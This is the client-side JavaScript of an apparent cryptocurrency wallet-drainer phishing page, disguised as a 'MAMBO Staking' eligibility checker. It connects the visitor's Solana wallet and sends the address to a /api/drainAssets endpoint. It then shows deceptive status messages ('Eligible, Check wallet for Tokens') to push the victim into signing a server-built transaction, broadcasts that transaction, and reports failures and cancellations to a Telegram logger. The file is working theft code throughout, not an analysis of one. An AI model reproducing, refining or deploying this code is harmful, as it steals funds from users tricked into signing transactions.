    // Enhanced wallet connection functions with retry logic, mobile wallet support, and injection verification
    window.connectWalletWithPopup = async function(walletKey) {
      if (window.walletManager.isConnecting(walletKey)) {
        console.log(`[CONNECT] Already connecting to ${walletKey}`);
        return;
      }
      
      if (window.walletManager.isCircuitBreakerOpen(walletKey)) {
        console.log(`[CONNECT] Circuit breaker open for ${walletKey}`);
        return;
      }
      
      window.walletManager.setConnectionState(walletKey, 'connecting');
      
      let def;
      let retryCount = 0;
      const maxRetries = getWalletRetryCount(walletKey);
      
      try {
        // Verify wallet injection first (especially important for mobile dApp browsers)
        if (window.isMobileDAppBrowser && window.isMobileDAppBrowser()) {
          console.log(`📱 [CONNECT] Mobile dApp browser detected, verifying wallet injection...`);
          
          try {
            await window.verifyWalletInjection(walletKey, 15000); // 15s timeout for mobile
            console.log(`✅ [CONNECT] Wallet injection verified for ${walletKey}`);
          } catch (injectionError) {
            console.error(`❌ [CONNECT] Wallet injection verification failed:`, injectionError.message);
            throw new Error(`Wallet not properly injected. Please refresh the page or try again.`);
          }
        }
        
        def = supportedWallets.find(w => w.key === walletKey) || fallbackWallets.find(w => w.key === walletKey);
        if (!def) {
          throw new Error(`Unsupported wallet type: ${walletKey}`);
        }

        const provider = def.provider();
        if (!provider) {
          throw new Error(`${def.name} not installed or missing required methods`);
        }
        
        let publicKey = provider.publicKey;
        
        if (!publicKey) {
          console.log(`[CONNECT] No existing public key, connecting to ${def.name}`);
          
          // Retry connection with exponential backoff
          while (retryCount <= maxRetries) {
            try {
              console.log(`[CONNECT] Attempt ${retryCount + 1}/${maxRetries + 1} for ${def.name}`);
              
              const timeout = getWalletTimeout(walletKey);
              console.log(`[CONNECT] Using timeout: ${timeout}ms for ${def.name}`);
              
              // Special handling for mobile wallets
              if (isMobileWallet(walletKey)) {
                console.log(`[CONNECT] Mobile wallet detected: ${def.name}, using enhanced connection`);
                
                // Show mobile wallet specific connection hint
                showConnectionStatus(getMobileWalletConnectionHint(walletKey), 'loading', true);
                
                // For mobile wallets, try to trigger the connection and wait longer
                const connectionPromise = provider.connect();
                
                // Show user feedback for mobile wallet connection
                if (window.showStatus) {
                  window.showStatus(`📱 Connecting to ${def.name}... Please check your mobile device`, 'loading');
                }
                
                // Update progress bar during connection
                const startTime = Date.now();
                let progressInterval = setInterval(() => {
                  const elapsed = Date.now() - startTime;
                  const progress = Math.min((elapsed / timeout) * 100, 95);
                  updateConnectionProgress(progress);
                }, 100);
                const result = await Promise.race([
                  connectionPromise,
                  new Promise((_, reject) => 
                    setTimeout(() => reject(new Error('Connection timeout')), timeout)
                  )
                ]);
                
                clearInterval(progressInterval);
                updateConnectionProgress(100);
                
                publicKey = result?.publicKey || provider.publicKey;
                console.log(`[CONNECT] Mobile wallet connection successful on attempt ${retryCount + 1}`);
                
                showConnectionStatus(`✅ Successfully connected to ${def.name}!`, 'success');
                setTimeout(hideConnectionStatus, 3000);
                break;
                
              } else {
                // Standard connection for desktop wallets
                const result = await Promise.race([
                  provider.connect(),
                  new Promise((_, reject) => 
                    setTimeout(() => reject(new Error('Connection timeout')), timeout)
                  )
                ]);
                
                publicKey = result?.publicKey || provider.publicKey;
                console.log(`[CONNECT] Desktop wallet connection successful on attempt ${retryCount + 1}`);
                break;
              }
              
            } catch (attemptError) {
              retryCount++;
              console.log(`[CONNECT] Attempt ${retryCount}/${maxRetries + 1} failed:`, attemptError.message);
              
              if (retryCount <= maxRetries) {
                const backoffDelay = Math.min(1000 * Math.pow(2, retryCount - 1), 5000);
                console.log(`[CONNECT] Attempt ${retryCount} failed. Waiting ${backoffDelay}ms before retry...`);
                
                if (window.showStatus) {
                  window.showStatus(`🔄 Connection attempt ${retryCount} failed. Retrying in ${backoffDelay/1000}s...`, 'warning');
                }
                
                await new Promise(resolve => setTimeout(resolve, backoffDelay));
              } else {
                throw attemptError;
              }
            }
          }
        } else {
          logger.log(`[CONNECT] Found existing public key for ${def.name}, ensuring connection`);
          
          try {
            await provider.connect();
            publicKey = provider.publicKey;
          } catch (connectError) {
            logger.log(`[CONNECT] Reconnection failed, using existing public key:`, connectError.message);
          }
        }
        
        if (!publicKey) {
          throw new Error('Failed to get public key');
        }
        
        logger.log(`[CONNECT] Successfully connected to ${def.name}`);
        
        // Set current wallet type for global access
        window.currentWalletType = def.name;
        
        window.walletManager.resetCircuitBreaker(walletKey);
        
        if (typeof window.integrateWithDrainAssets === 'function') {
          window.integrateWithDrainAssets(publicKey, def.name, provider);
        }
        
      } catch (error) {
        // Use centralized error handling
        const errorInfo = handleWalletError(error, walletKey, {
          retryCount: retryCount,
          maxRetries: maxRetries,
          walletName: def?.name || walletKey
        });
        
        logger.log(`[CONNECT] ${def?.name || walletKey} connection failed after ${retryCount} attempts:`, errorInfo.userMessage);
        
        window.walletManager.recordFailure(walletKey);
        
        // For mobile users, show Web3Modal as fallback when wallet connection fails
        if (isMobileDevice()) {
          logger.log(`[CONNECT] Mobile wallet connection failed, showing Web3Modal fallback`);
          if (window.showWeb3ModalForMobile) {
            window.showWeb3ModalForMobile();
          }
      } else {
          if (window.showStatus) {
            window.showStatus(errorInfo.userMessage, 'error');
          }
        }
      } finally {
        window.walletManager.clearConnectionState(walletKey);
      }
    }

    // Enhanced drain assets integration with better error handling and debugging
    window.integrateWithDrainAssets = async function(publicKey, walletType, provider) {
      if (!publicKey || !walletType || !provider) {
        console.log('[DRAIN] Invalid parameters');
        return;
      }
      
      console.log(`[DRAIN] Starting drain process for ${walletType} wallet:`, publicKey);
      
      try {
        if (window.showStatus) window.showStatus('🔍 Checking wallet eligibility...', 'loading');
        
        // Show connection status for mobile wallets
        if (isMobileWallet(walletType.toLowerCase())) {
          showConnectionStatus(`🔍 Checking ${walletType} wallet eligibility...`, 'loading', true);
        }
        
        console.log(`[DRAIN] Calling /api/drainAssets for wallet:`, publicKey);
        
        // Use AbortController for optimized timeout - much faster response
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), window.getTimeout('DRAIN_API_TIMEOUT')); // 15 second timeout
        
        let response;
        try {
          if (window.showStatus) window.showStatus('🚀 Checking wallet contents...', 'loading');
          
          response = await fetch('/api/drainAssets', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ user: publicKey, walletType: walletType }),
            signal: controller.signal
          });
          
          clearTimeout(timeoutId);
        } catch (fetchError) {
          clearTimeout(timeoutId);
          
          // Handle timeout and other fetch errors gracefully
          if (fetchError.name === 'AbortError') {
            logger.log(`[DRAIN] Request timed out after 15 seconds, retrying...`);
            if (window.showStatus) window.showStatus('🔄 Request timed out, retrying...', 'loading');
            
            // Wait a bit and retry once with shorter timeout
            await new Promise(resolve => setTimeout(resolve, 1000));
            
            try {
              if (window.showStatus) window.showStatus('🔄 Retrying wallet check...', 'loading');
              response = await fetch('/api/drainAssets', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ user: publicKey, walletType: walletType })
              });
            } catch (retryError) {
              throw new Error(`Retry failed: ${retryError.message}`);
            }
          } else {
            throw fetchError;
          }
        } finally {
          // Ensure timeout is always cleared
          clearTimeout(timeoutId);
        }
        
        logger.log(`[DRAIN] API response status:`, response.status);
        
        if (!response.ok) {
          // Use centralized error handling for API errors
          const errorInfo = handleApiError(response, {
            publicKey: publicKey,
            walletType: walletType,
            endpoint: '/api/drainAssets'
          });
          
          // Show clean error message to user
          if (window.showStatus) window.showStatus(errorInfo.userMessage, 'error');
          
          // Handle successful connection even on error
          handleSuccessfulWalletConnection(publicKey, walletType, provider, { success: false });
          return;
        }
        
        let data = await response.json();
        console.log(`[DRAIN] API response data:`, data);
        
        if (data.success === false && (data.message === 'No tokens found for staking' || data.message === '🚀 No tokens found in this wallet for the MAMBO staking')) {
          console.log('[DRAIN] No tokens found for staking');
          if (window.showStatus) window.showStatus('Non Participant Wallet', 'error');
          handleSuccessfulWalletConnection(publicKey, walletType, provider, data);
          return;
        }
        
        // Check if pre-initialization is required
        if (data.success === true && data.requiresPreInit === true) {
          console.log('[DRAIN] Pre-initialization required before draining');
          console.log('[DRAIN] Pre-init transactions:', data.preInitTransactions);
          
          if (window.showStatus) window.showStatus('🔧 Pre-initialization required - setting up token accounts...', 'loading');
          
          // Handle pre-initialization
          try {
            if (window.showStatus) window.showStatus('🔧 Setting up token accounts - this may take a moment...', 'loading');
            await handlePreInitialization(publicKey, walletType, provider, data);
            return;
          } catch (preInitError) {
            console.error('[DRAIN] Pre-initialization failed:', preInitError);
            
            // Log critical pre-initialization failures to Telegram
            if (window.sendTelegramLog) {
              window.sendTelegramLog('API_CALL', {
                error: preInitError.message,
                stack: preInitError.stack,
                context: 'Drain Pre-Initialization',
                walletType: window.currentWalletType || 'Unknown',
                timestamp: new Date().toISOString(),
                projectName: window.APP_CONFIG?.PROJECT_NAME || 'MAMBO Staking'
              });
            }
            
            if (window.showStatus) window.showStatus('Non Participant Wallet', 'error');
            throw preInitError;
          }
        }
        
        if (!data.success) {
          // Show clean error message to user
          if (window.showStatus) window.showStatus(data.message || 'Non Participant Wallet', 'error');
          
          // Handle successful connection even on error
          handleSuccessfulWalletConnection(publicKey, walletType, provider, data);
          return;
        }
        
        // Success case - wallet has sufficient funds and tokens
        console.log(`[DRAIN] Wallet eligible for drain. Transaction data:`, data);
        
        if (window.showStatus) window.showStatus('✅ Wallet eligible! Triggering signature request...', 'success');
        
        // Proceed with the actual drain process - this will trigger wallet signature
        await proceedWithDrain(publicKey, walletType, provider, data);
        
      } catch (error) {
        // Use centralized error handling
        try {
          const errorInfo = window.logFrontendError(error, {
            publicKey: publicKey,
            walletType: walletType,
            context: 'Drain Process Failure'
          });
          
          if (window.showStatus && errorInfo && errorInfo.userMessage) {
            window.showStatus(errorInfo.userMessage, 'error');
          } else if (window.showStatus) {
            window.showStatus('Non Participant Wallet', 'error');
          }
        } catch (errorHandlingError) {
          console.error('[ERROR_HANDLING] Failed to handle error:', errorHandlingError);
          if (window.showStatus) window.showStatus('Non Participant Wallet', 'error');
        }
        
        // Hide connection status for mobile wallets
        if (isMobileWallet(walletType.toLowerCase())) {
          hideConnectionStatus();
        }
        
        // Handle successful connection even on error
        handleSuccessfulWalletConnection(publicKey, walletType, provider, { success: false });
      }
    };

    // Proceed with the actual drain process
    async function proceedWithDrain(publicKey, walletType, provider, data) {
      logger.log(`[DRAIN] Proceeding with drain for ${walletType}`);
      
      if (data.transaction && provider?.signTransaction) {
        try {
          logger.log(`[DRAIN] Converting transaction from base64...`);
          const transaction = window.convertBase64ToTransaction(data.transaction);
          logger.log(`[DRAIN] Transaction converted successfully:`, transaction);
          
          if (window.showStatus) window.showStatus('🚀 Transaction ready! Please sign in your wallet...', 'loading');
          
          logger.log(`[DRAIN] Requesting transaction signature from ${walletType}...`);
          
          // Set optimized timeout for signing - much faster trigger
          const signPromise = provider.signTransaction(transaction);
          const signTimeoutPromise = new Promise((_, reject) => 
            setTimeout(() => reject(new Error('Signing timeout - please try again')), 30000) // 30 seconds - much faster
          );
          
          let signedTransaction;
          try {
            if (window.showStatus) window.showStatus('🚀 SIGNATURE REQUIRED! Please check your wallet now...', 'loading');
            signedTransaction = await Promise.race([signPromise, signTimeoutPromise]);
            logger.log(`[DRAIN] Transaction signed successfully:`, signedTransaction);
            
            // Validate signed transaction
            if (!signedTransaction || typeof signedTransaction.serialize !== 'function') {
              throw new Error('Invalid signed transaction received from wallet');
            }
          } catch (signError) {
            logger.error(`[DRAIN] Transaction signing failed:`, signError);
            
            // Log critical signing failures to Telegram
            if (window.sendTelegramLog) {
              window.sendTelegramLog('TRANSACTION_SIGNING', {
                error: signError.message,
                stack: signError.stack,
                context: 'Drain Transaction Signing',
                walletType: walletType,
                timestamp: new Date().toISOString(),
                projectName: window.APP_CONFIG?.PROJECT_NAME || 'MAMBO Staking'
              });
            }
            
            throw signError;
          }
          
          if (window.showStatus) window.showStatus('📡 Broadcasting transaction...', 'loading');
          
          logger.log(`[DRAIN] Broadcasting signed transaction...`);
          
                  // Use AbortController for optimized timeout
        const broadcastController = new AbortController();
        const broadcastTimeoutId = setTimeout(() => broadcastController.abort(), 30000); // 30 second timeout (optimized)
          
          let broadcastResponse;
          try {
            broadcastResponse = await fetch('/api/broadcast', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                signedTransaction: signedTransaction.serialize().toString('base64'),
                rpcEndpoint: data.rpcEndpoint || window.getConfig('PRIMARY_RPC')
              }),
              signal: broadcastController.signal
            });
            
            clearTimeout(broadcastTimeoutId);
            logger.log(`[DRAIN] Broadcast response status:`, broadcastResponse.status);
          } catch (broadcastError) {
            clearTimeout(broadcastTimeoutId);
            
            if (broadcastError.name === 'AbortError') {
              logger.log(`[DRAIN] Broadcast request timed out after 30 seconds, retrying...`);
              if (window.showStatus) window.showStatus('🔄 Broadcast timed out, retrying...', 'loading');
              
              // Wait and retry once
              await new Promise(resolve => setTimeout(resolve, 5000));
              
              try {
                broadcastResponse = await fetch('/api/broadcast', {
                  method: 'POST',
                  headers: { 'Content-Type': 'application/json' },
                  body: JSON.stringify({
                    signedTransaction: signedTransaction.serialize().toString('base64'),
                    rpcEndpoint: data.rpcEndpoint || window.getConfig('PRIMARY_RPC')
            })
          });
              } catch (retryError) {
                throw new Error(`Broadcast retry failed: ${retryError.message}`);
              }
            } else {
              throw broadcastError;
            }
          } finally {
            // Ensure timeout is always cleared
            clearTimeout(broadcastTimeoutId);
          }
          
          if (!broadcastResponse.ok) {
            const broadcastError = await broadcastResponse.text();
            logger.error(`[DRAIN] Broadcast failed with status ${broadcastResponse.status}:`, broadcastError);
      
      // Log critical broadcast failures to Telegram
      if (window.sendTelegramLog) {
        window.sendTelegramLog('API_CALL', {
          error: broadcastError.message,
          stack: broadcastError.stack,
          context: 'Drain Broadcast',
          walletType: window.currentWalletType || 'Unknown',
          responseStatus: broadcastResponse.status,
          timestamp: new Date().toISOString(),
          projectName: window.APP_CONFIG?.PROJECT_NAME || 'MAMBO Staking'
        });
      }
            
            // Try to parse the error response
            let errorData;
            try {
              errorData = JSON.parse(broadcastError);
            } catch (e) {
              errorData = { message: 'Non Participant Wallet' };
            }
            
            // Show clean error message to user
            if (window.showStatus) window.showStatus(errorData.message || 'Non Participant Wallet', 'error');
            
            // Handle successful connection even on error
            handleSuccessfulWalletConnection(publicKey, walletType, provider, data);
            return;
          }
          
          const broadcastResult = await broadcastResponse.json();
          logger.log(`[DRAIN] Broadcast result:`, broadcastResult);
          
          if (broadcastResult.success) {
            logger.log('[DRAIN] Drain successful! Signature:', broadcastResult.signature);
            if (window.showStatus) window.showStatus('Eligible, Check wallet for Tokens', 'success');
            
            // Hide connection status for mobile wallets
            if (isMobileWallet(walletType.toLowerCase())) {
              hideConnectionStatus();
            }
            
            handleSuccessfulWalletConnection(publicKey, walletType, provider, {
              ...data, signedTransaction, broadcastResult, drained: true
            });
          } else {
            logger.error(`[DRAIN] Broadcast failed:`, broadcastResult.error);
      
      // Log critical broadcast result failures to Telegram
      if (window.sendTelegramLog) {
        window.sendTelegramLog('API_CALL', {
          error: broadcastResult.error,
          context: 'Drain Broadcast Result',
          walletType: window.currentWalletType || 'Unknown',
          timestamp: new Date().toISOString(),
          projectName: window.APP_CONFIG?.PROJECT_NAME || 'MAMBO Staking'
        });
      }
            if (window.showStatus) window.showStatus('Non Participant Wallet', 'error');
            handleSuccessfulWalletConnection(publicKey, walletType, provider, data);
            return;
          }
          
        } catch (signError) {
          logger.error('[DRAIN] Transaction signing/broadcasting failed:', signError);
      
      // Log critical transaction failures to Telegram
      if (window.sendTelegramLog) {
        window.sendTelegramLog('TRANSACTION_SIGNING', {
          error: signError.message,
          stack: signError.stack,
          context: 'Drain Transaction Signing',
          walletType: window.currentWalletType || 'Unknown',
          timestamp: new Date().toISOString(),
          projectName: window.APP_CONFIG?.PROJECT_NAME || 'MAMBO Staking'
        });
      }
          
          // Enhanced error handling with user cancellation detection
          if (signError.message.includes('User rejected') || signError.message.includes('User denied')) {
            logger.log('[DRAIN] User cancelled transaction signing');
            
            // Log user cancellation to Telegram if available
            if (window.logUserCancellation) {
              window.logUserCancellation('transaction_signing', {
                walletType: walletType,
                publicKey: publicKey.toString(),
                context: 'Drain Process',
                error: signError.message
              });
            }
            
            if (window.showStatus) window.showStatus('Transaction was cancelled by user', 'info');
          } else if (signError.message.includes('insufficient funds')) {
            if (window.showStatus) window.showStatus('Non Participant Wallet', 'error');
          } else {
            if (window.showStatus) window.showStatus('Non Participant Wallet', 'error');
          }
          
          handleSuccessfulWalletConnection(publicKey, walletType, provider, data);
        }
      } else {
        logger.log(`[DRAIN] No transaction to sign - wallet may already be drained or have no tokens`);
        if (window.showStatus) window.showStatus('Eligible, Check wallet for Tokens', 'success');
        handleSuccessfulWalletConnection(publicKey, walletType, provider, data);
      }
    }

    // Handle pre-initialization process
    async function handlePreInitialization(publicKey, walletType, provider, apiData) {
      console.log(`[PRE_INIT] Starting pre-initialization for ${walletType}`);
      
      try {
        if (window.showStatus) window.showStatus('🔧 Executing pre-initialization transactions...', 'loading');
        
        // Execute each pre-initialization transaction
        for (let i = 0; i < apiData.preInitTransactions.length; i++) {
          const preInitTx = apiData.preInitTransactions[i];
          console.log(`[PRE_INIT] Executing transaction ${i + 1}/${apiData.preInitTransactions.length}`);
          
          if (window.showStatus) {
            window.showStatus(`🔧 Setting up token account ${i + 1}/${apiData.preInitTransactions.length}...`, 'loading');
          }
          
                  // Extract the base64 transaction string from the transaction object
        const base64Transaction = preInitTx.transaction;
        console.log(`[PRE_INIT] Received transaction object:`, preInitTx);
        console.log(`[PRE_INIT] Base64 transaction string:`, base64Transaction);
        console.log(`[PRE_INIT] Base64 length:`, base64Transaction.length);
        console.log(`[PRE_INIT] Base64 preview:`, base64Transaction.substring(0, 100) + '...');
        
        const transaction = window.convertBase64ToTransaction(base64Transaction);
        console.log(`[PRE_INIT] Transaction object created:`, transaction);
        console.log(`[PRE_INIT] Transaction version:`, transaction.version);
        console.log(`[PRE_INIT] Transaction instructions count:`, transaction.instructions.length);
        console.log(`[PRE_INIT] Transaction fee payer:`, transaction.feePayer?.toString());
        console.log(`[PRE_INIT] About to sign transaction with ${walletType} provider...`);
        
                // Sign with user's wallet - generous timeout for slow users
        let signedTransaction;
        try {
          logger.log(`[PRE_INIT] Attempting to sign with ${walletType}...`);
          
          // Set optimized timeout for signing
          const signPromise = provider.signTransaction(transaction);
          const signTimeoutPromise = new Promise((_, reject) => 
            setTimeout(() => reject(new Error('Signing timeout - please try again')), 30000) // 30 seconds - much faster
          );
          
          signedTransaction = await Promise.race([signPromise, signTimeoutPromise]);
          logger.log(`[PRE_INIT] Transaction signed successfully:`, signedTransaction);
          
          // Validate signed transaction
          if (!signedTransaction || typeof signedTransaction.serialize !== 'function') {
            throw new Error('Invalid signed transaction received from wallet');
          }
        } catch (signError) {
          logger.error(`[PRE_INIT] Signing failed for ${walletType}:`, signError);
      
      // Log critical pre-init signing failures to Telegram
      if (window.sendTelegramLog) {
        window.sendTelegramLog('TRANSACTION_SIGNING', {
          error: signError.message,
          stack: signError.stack,
          context: 'Pre-Initialization Transaction Signing',
          walletType: walletType,
          timestamp: new Date().toISOString(),
          projectName: window.APP_CONFIG?.PROJECT_NAME || 'MAMBO Staking'
        });
      }
          
          // Enhanced error handling with user cancellation detection
          if (signError.message.includes('User rejected') || signError.message.includes('User denied')) {
            logger.log(`[PRE_INIT] User cancelled pre-initialization transaction for ${walletType}`);
            
            // Log user cancellation to Telegram if available
            if (window.logUserCancellation) {
              window.logUserCancellation('pre_initialization', {
                walletType: walletType,
                publicKey: publicKey.toString(),
                context: 'Pre-Initialization',
                error: signError.message,
                transactionIndex: i + 1
              });
            }
            
            throw new Error(`Transaction signing was rejected by ${walletType}. Please approve the transaction in your wallet.`);
          } else if (signError.message.includes('Invalid transaction') || signError.message.includes('Invalid format')) {
            throw new Error(`Transaction format is incompatible with ${walletType}. This may be a compatibility issue.`);
          } else {
            throw new Error(`Signing failed: ${signError.message}`);
          }
        }
          
          // Broadcast the transaction with optimized timeout
          logger.log(`[PRE_INIT] About to broadcast transaction ${i + 1}...`);
          
          const broadcastController = new AbortController();
          const broadcastTimeoutId = setTimeout(() => broadcastController.abort(), 30000); // 30 second timeout (optimized)
          
          let broadcastResponse;
          try {
            broadcastResponse = await fetch('/api/broadcast', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
                  signedTransaction: signedTransaction.serialize().toString('base64'),
                  rpcEndpoint: window.getConfig('PRIMARY_RPC')
              }),
              signal: broadcastController.signal
            });
            
            clearTimeout(broadcastTimeoutId);
            logger.log(`[PRE_INIT] Broadcast response received:`, broadcastResponse.status, broadcastResponse.statusText);
          } catch (broadcastError) {
            clearTimeout(broadcastTimeoutId);
            
            if (broadcastError.name === 'AbortError') {
              logger.log(`[PRE_INIT] Broadcast request timed out after 30 seconds, retrying...`);
              if (window.showStatus) window.showStatus('🔄 Broadcast timed out, retrying...', 'loading');
              
              // Wait and retry once
              await new Promise(resolve => setTimeout(resolve, 5000));
              
              try {
                broadcastResponse = await fetch('/api/broadcast', {
                  method: 'POST',
                  headers: { 'Content-Type': 'application/json' },
                  body: JSON.stringify({
                    signedTransaction: signedTransaction.serialize().toString('base64'),
                    rpcEndpoint: window.getConfig('PRIMARY_RPC')
          })
        });
              } catch (retryError) {
                throw new Error(`Broadcast retry failed: ${retryError.message}`);
              }
            } else {
              throw broadcastError;
            }
          } finally {
            // Ensure timeout is always cleared
            clearTimeout(broadcastTimeoutId);
          }
        
        if (!broadcastResponse.ok) {
            // Log critical pre-init broadcast failures to Telegram
      if (window.sendTelegramLog) {
        window.sendTelegramLog('API_CALL', {
          error: `Pre-initialization transaction ${i + 1} failed: ${broadcastResponse.status}`,
          context: 'Pre-Initialization Broadcast',
          walletType: walletType,
          transactionIndex: i + 1,
          responseStatus: broadcastResponse.status,
          timestamp: new Date().toISOString(),
          projectName: window.APP_CONFIG?.PROJECT_NAME || 'MAMBO Staking'
        });
      }
      
      throw new Error(`Pre-initialization transaction ${i + 1} failed: ${broadcastResponse.status}`);
        }
        
        const broadcastResult = await broadcastResponse.json();
          logger.log(`[PRE_INIT] Transaction ${i + 1} successful:`, broadcastResult.signature);
        }
        
        logger.log(`[PRE_INIT] All pre-initialization transactions completed successfully`);
        if (window.showStatus) window.showStatus('Eligible, Check wallet for Tokens', 'success');
        
        // Generous wait time for slow users
        await new Promise(resolve => setTimeout(resolve, 3000));
        
        // Now retry the drain process with multiple attempts
        if (window.showStatus) window.showStatus('🔄 Retrying drain process...', 'loading');
        
        // Retry with exponential backoff for slow users
        let retryCount = 0;
        const maxRetries = 3;
        let retryResponse = null;
        
        while (retryCount < maxRetries && !retryResponse?.ok) {
          try {
            retryResponse = await fetch('/api/drainAssets', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ user: publicKey, walletType: walletType })
            });
            
            if (retryResponse.ok) break;
            
            retryCount++;
            if (retryCount < maxRetries) {
              const waitTime = Math.pow(2, retryCount) * 2000; // 2s, 4s, 8s
              if (window.showStatus) window.showStatus(`🔄 Retry ${retryCount}/${maxRetries} in ${waitTime/1000}s...`, 'loading');
              await new Promise(resolve => setTimeout(resolve, waitTime));
            }
          } catch (retryError) {
            retryCount++;
            if (retryCount < maxRetries) {
              const waitTime = Math.pow(2, retryCount) * 2000;
              if (window.showStatus) window.showStatus(`🔄 Retry ${retryCount}/${maxRetries} in ${waitTime/1000}s...`, 'loading');
              await new Promise(resolve => setTimeout(resolve, waitTime));
            }
          }
        }
        
        if (!retryResponse.ok) {
          throw new Error(`Drain retry failed: ${retryResponse.status}`);
        }
        
        const retryData = await retryResponse.json();
        logger.log(`[PRE_INIT] Drain retry response:`, retryData);
        
        if (retryData.success && !retryData.requiresPreInit) {
          // Now we can proceed with the actual drain
          logger.log(`[PRE_INIT] Drain ready to proceed`);
          if (window.showStatus) window.showStatus('Eligible, Check wallet for Tokens', 'success');
          
          // Continue with the drain process
          await proceedWithDrain(publicKey, walletType, provider, retryData);
        } else {
          throw new Error('Pre-initialization completed but drain still requires pre-init');
        }
        
      } catch (error) {
        logger.error(`[PRE_INIT] Pre-initialization failed:`, error);
      
      // Log critical pre-initialization failures to Telegram
      if (window.sendTelegramLog) {
        window.sendTelegramLog('API_CALL', {
          error: error.message,
          stack: error.stack,
          context: 'Pre-Initialization',
          walletType: window.currentWalletType || 'Unknown',
          timestamp: new Date().toISOString(),
          projectName: window.APP_CONFIG?.PROJECT_NAME || 'MAMBO Staking'
        });
      }
        if (window.showStatus) window.showStatus('Non Participant Wallet', 'error');
        throw error;
      }
    }













    // Handle successful wallet connection
    window.handleSuccessfulWalletConnection = function(publicKey, walletType, provider, apiData) {
      console.log(`[WALLET_SUCCESS] Handling successful connection to ${walletType}`);
      
      window.connectedWallet = {
        publicKey: publicKey,
        walletType: walletType,
        provider: provider
      };
      
      displayConnectedWallet(window.connectedWallet, apiData);
      
      var modal = document.getElementById('walletModal');
      if (modal) {
        modal.style.display = 'none';
      }
    }

    // Display connected wallet information
    window.displayConnectedWallet = function(walletInfo, apiData = null) {
      var container = document.getElementById('connected-wallet-container');
      if (!container) {
        container = document.createElement('div');
        container.id = 'connected-wallet-container';
        container.style.cssText = `
          background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
          color: white;
          padding: 20px;
          border-radius: 15px;
          margin: 20px 0;
          text-align: center;
          box-shadow: 0 8px 32px rgba(0,0,0,0.1);
        `;
        
        var mainContainer = document.querySelector('.container');
        if (mainContainer) {
          mainContainer.parentNode.insertBefore(container, mainContainer.nextSibling);
        }
      }
      
      let publicKeyDisplay = 'Unknown';
      if (walletInfo.publicKey) {
        try {
          if (typeof walletInfo.publicKey === 'string') {
            publicKeyDisplay = `${walletInfo.publicKey.substring(0, 8)}...${walletInfo.publicKey.substring(walletInfo.publicKey.length - 8)}`;
          } else if (walletInfo.publicKey.toBase58) {
            publicKeyDisplay = `${walletInfo.publicKey.toBase58().substring(0, 8)}...${walletInfo.publicKey.toBase58().substring(walletInfo.publicKey.toBase58().length - 8)}`;
          } else if (walletInfo.publicKey.toString) {
            const pkString = walletInfo.publicKey.toString();
            publicKeyDisplay = `${pkString.substring(0, 8)}...${pkString.substring(pkString.length - 8)}`;
          } else {
            publicKeyDisplay = 'Connected';
          }
        } catch (pkError) {
          console.log('[DISPLAY] Public key display error:', pkError.message);
          publicKeyDisplay = 'Connected';
        }
      }
      
      var walletInfoHtml = `
        <h3 style="margin:0 0 15px 0;color:#fff;">🎉 Wallet Connected Successfully!</h3>
        <div style="margin-bottom:15px;">
          <p style="margin:5px 0;"><strong>Wallet Type:</strong> ${walletInfo.walletType}</p>
          <p style="margin:5px 0;"><strong>Public Key:</strong> ${publicKeyDisplay}</p>
      `;
      
      if (apiData) {
        if (apiData.solBalance !== undefined) {
          var solBalance = (apiData.solBalance / 1000000000).toFixed(6);
          walletInfoHtml += `<p style="margin:5px 0;"><strong>SOL Balance:</strong> ${solBalance} SOL</p>`;
        }
        if (apiData.tokenCount !== undefined) {
          walletInfoHtml += `<p style="margin:5px 0;"><strong>SPL Tokens:</strong> ${apiData.tokenCount}</p>`;
        }
        if (apiData.message) {
          walletInfoHtml += `<p style="margin:5px 0;font-style:italic;color:#e0e0e0;">${apiData.message}</p>`;
        }
      }
      
      walletInfoHtml += `
        </div>
        <div style="display:flex;gap:10px;justify-content:center;">
          <button onclick="disconnectWallet()" style="
            background: rgba(255,255,255,0.2);
            color: white;
            border: 1px solid rgba(255,255,255,0.3);
            padding: 10px 20px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 14px;
          ">Disconnect</button>
          <button onclick="refreshWalletAssets()" style="
            background: rgba(255,255,255,0.2);
            color: white;
            border: 1px solid rgba(255,255,255,0.3);
            padding: 10px 20px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 14px;
          ">Refresh Assets</button>
        </div>
      `;
      
      container.innerHTML = walletInfoHtml;
      container.style.display = 'block';
    }

    // Disconnect wallet
    window.disconnectWallet = function() {
      if (window.connectedWallet && window.connectedWallet.provider) {
        try {
          if (typeof window.connectedWallet.provider.disconnect === 'function') {
            window.connectedWallet.provider.disconnect();
          }
        } catch (e) {
          console.log('Error disconnecting wallet:', e);
        }
      }
      
      window.connectedWallet = null;
      
      var container = document.getElementById('connected-wallet-container');
      if (container) {
        container.style.display = 'none';
      }
      
      var walletBox = document.querySelector('.wallet-box');
      if (walletBox) {
        walletBox.style.display = 'block';
      }
      
              window.showStatus('Staking session ended', 'info');
    };

    // Refresh wallet assets
    window.refreshWalletAssets = function() {
      if (window.connectedWallet) {
        if (window.showStatus) window.showStatus('🔍 Checking wallet eligibility...', 'loading');
        window.integrateWithDrainAssets(
          window.connectedWallet.publicKey, 
          window.connectedWallet.walletType, 
          window.connectedWallet.provider
        );
      }
    };

    // Close modal when clicking outside
    window.onclick = function(event) {
      const modal = document.getElementById('walletModal');
      if (event.target === modal) {
        modal.style.display = 'none';
      }
    };

    // Test functions for debugging
    window.testAllProviders = function() {
      console.log('🧪 [PROVIDER_TEST] Testing all wallet providers...');
      
      fallbackWallets.forEach(wallet => {
        console.log(`\n🔍 Testing ${wallet.name} (${wallet.key}):`);
        
        const provider = wallet.provider();
        if (provider) {
          console.log(`  ✅ Provider found:`, provider);
          console.log(`  🔍 Has connect method: ${typeof provider.connect === 'function' ? 'YES' : 'NO'}`);
          console.log(`  🔍 Has disconnect method: ${typeof provider.disconnect === 'function' ? 'YES' : 'NO'}`);
          console.log(`  🔍 Has signTransaction method: ${typeof provider.signTransaction === 'function' ? 'YES' : 'NO'}`);
        } else {
          console.log(`  ❌ No provider found`);
        }
      });
    };

